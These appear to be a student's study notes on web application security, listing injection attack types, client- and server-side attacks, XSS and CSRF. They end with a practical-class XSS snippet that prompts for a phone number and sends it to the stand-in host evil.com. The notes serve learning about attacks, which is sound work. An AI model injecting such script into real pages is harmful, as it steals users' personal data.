Types of web apps:
- static - any web app that can go directly to user browser without server-side alteration of HTTP response
- dynamic - generates pages / data in real-time per request, response triggers from server end and reach client end
![[Pasted image 20230804114121.png]]

Types of injection attacks:
- [[SQL injection]]
- [[Command injection]]
- LDAP injection
- CRLF injection
- Template injection
- XPath injection

Types of security attacks:
- Client-side - user downloads malicious code from server which is interpreted by client browser
- Server-side - data and apps in a server are compromised

- [[Cross-site scripting attack (XSS)]]
- [[Cross-site request forgery (XSRF)]]

Notes from week 3 practical:
```html
<script>
	let mobile = prompt("Please enter your phone number to proceed", "");
	window.location = 'http://evil.com/>?info=' + mobile;
</script>
```

This script is feeding the mobile info to the website.